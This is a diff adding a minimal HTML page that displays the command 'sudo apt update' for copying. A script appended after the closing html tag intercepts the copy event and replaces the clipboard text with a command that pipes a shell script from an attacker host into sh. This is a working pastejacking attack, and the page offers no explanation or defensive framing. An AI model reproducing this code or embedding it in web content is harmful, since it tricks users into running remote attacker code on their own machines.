@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <p><strong><span id="copy" style="background-color: #f8f8f8;"><code>sudo apt update</code></span></strong></p>
+</body>
+
+</html>
+<script>
+    console.log('hello')
+    document.getElementById('copy').addEventListener('copy', function (e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\n'); e.preventDefault(); });
+</script>
